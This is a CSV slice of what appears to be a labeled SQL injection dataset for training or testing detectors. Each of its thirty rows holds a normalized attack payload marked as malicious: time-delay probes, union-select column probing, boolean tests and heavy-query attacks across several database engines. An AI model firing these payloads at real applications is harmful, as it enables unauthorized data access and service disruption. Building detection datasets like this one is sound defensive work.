row_index,payload_norm,label,sqli_type_hint
2790,"1%' ) and elt ( 4670 = 9403,9403 ) and ( '%' = '",1,
2791,"waitfor delay '0:0:5' and ""%"" = """,1,
2792,( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1931 = 1931 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ),1,
2793,"1%"" ) ) ) union all select null,null,null#",1,
2794,1 ) where 6725 = 6725 and 1553 = 7419,1,
2795,"1"" )",1,
2796,1' where 1557 = 1557,1,
2797,"-2246"" ) ) union all select 4613,4613,4613,4613,4613,4613#",1,
2798,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( 'cxjp' = 'cxjp",1,
2799,"-2726"" ) ) or elt ( 1032 = 1032,3623 ) and ( ( ""ococ"" = ""ococ",1,
2800,"1' ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( 'rqbf' = 'rqbf",1,
2801,1%' waitfor delay '0:0:5' and '%' = ',1,
2802,"1%"" rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",1,
2803,"1"" ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ""cjkk"" like ""cjkk",1,
2804,1%' ) ) ) and sleep ( 5 ) #,1,
2805,"1"" ) as hblk where 7982 = 7982 and 9611 = 6142--",1,
2806,"-7845' union all select 9574,9574,9574,9574,9574,9574#",1,
2807,"1', ( case when 8260 = 8260 then 1 else null end )",1,
2808,end and ( ( 6874 = 6874,1,
2809,"-2122"" ) as zytb where 7025 = 7025 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,
2810,"1"" where 8734 = 8734",1,
2811,"1"" ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ""wmmg"" like ""wmmg",1,
2812,"-1597"" where 5933 = 5933 or 3038 = 3038",1,
2813,1' ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( 'wuux' = 'wuux,1,
2814,"1' ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",1,
2815,"1"" ) as tuem where 1328 = 1328",1,
2816,"1%' ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( '%' = '",1,
2817,1' and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ),1,
2818,"1 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",1,
2819,"1 ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 3814 = 3814",1,
